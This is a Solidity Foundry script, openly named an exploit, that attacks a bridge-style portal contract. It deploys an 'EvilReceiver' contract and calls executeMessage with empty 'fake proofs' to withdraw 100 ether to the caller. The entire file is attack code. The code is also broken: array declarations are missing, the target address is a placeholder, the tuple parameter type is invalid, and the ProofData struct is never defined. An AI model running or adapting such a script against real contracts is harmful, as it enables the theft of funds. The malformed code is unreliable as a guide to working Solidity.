// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPortal {
    function executeMessage(
        address receiver,
        uint256 amount,
        address[] calldata targets,
        bytes[] calldata data,
        uint256 salt,
        tuple(bytes,bytes,bytes) calldata proofs,
        uint16 index
    ) external;
}

contract EvilReceiver {
    function onMessageReceived(bytes calldata) external {
        // malicious logic
    }
}

contract PortalExploit is Script {

    function run() external {
        address portal = 0xTARGET;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        EvilReceiver evil = new EvilReceiver();

        address;
        targets[0] = address(evil);

        bytes;
        data[0] = abi.encodeWithSelector(
            bytes4(0x3a69197e),
            ""
        );

        // fake proofs
        bytes memory empty;

        IPortal(portal).executeMessage(
            msg.sender,
            100 ether,
            targets,
            data,
            0,
            IPortal.ProofData(empty, empty, empty),
            0
        );

        vm.stopBroadcast();
    }
}